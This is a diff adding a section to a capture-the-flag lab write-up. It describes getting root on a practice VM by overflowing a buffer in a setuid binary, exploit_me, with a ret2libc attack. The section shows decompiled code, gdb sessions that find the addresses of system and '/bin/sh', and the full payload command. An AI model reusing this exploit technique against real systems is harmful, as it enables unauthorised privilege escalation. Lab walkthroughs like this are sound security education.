@@ -437,3 +437,68 @@ with instructions to draw something, and a clue at the end, which probably mean 
 ```
 
 we wrote a simple script to draw the turtle instructions, which reveal the word `SLASH`.
+i tried to ssh with the sha256 of the word, but it didn't work, so i tried with another digest, md5, and it worked.
+
+now on the user zaz, there is a empty email folder, and setuid binary, which mean it's run as root, if we can exploit it we can get root access.
+opening the binary in binaryninja we can see it's a simple program that copy a user provided string into a buffer without checking the size. we can make the program write more data than the size of the buffer and overwrite the return address of main to the `system` function with `/bin/sh` as a argument, and get a root shell (ret2libc attack).
+
+```c
+080483f4  int32_t main(int32_t argc, char** argv, char** envp)
+
+08048404      int32_t eax
+08048404      if (argc s> 1)
+08048420          void str
+08048420          strcpy(&str, argv[1])
+0804842c          puts(str: &str)
+08048431          eax = 0
+08048406      else
+08048406          eax = 1
+08048437      return eax
+```
+
+binaryninja tells us `str` have a stack offset of -0x90 (144) and there is a int just before taking 4 bytes, so we know the buffer is 140 bytes long.
+to make our payload we need to fill the buffer with 140 bytes, then the address of `system`, and after that the adress of a block of text containing `/bin/sh` that will be used by `system` as argument.
+in gdb:
+
+```
+(gdb) print system
+$2 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+to get a pointer to a string containing `/bin/sh` there is multiples possibilities, like using a environment variable, passing it in argv[1] to be copied, or the simplest finding it in the libc.
+
+```
+(gdb) info proc map
+process 2147
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0
+        0xb7fda000 0xb7fdd000     0x3000        0x0
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e6b060  system
+A syntax error in expression, near `system'.
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+writing our exploit:
+
+```shell
+./exploit_me $(python -c 'print "i"*140 + "\x60\xb0\xe6\xb7" + "i"*4 + "\x58\xcc\xf8\xb7"')
+```
+
+the four spacer between the address of `system` and the address of `/bin/sh` is to fill the 4 bytes corresponding to the return address of the new stack frame created for system. the argument to a function is right after.
+
+running our exploit and we are root.
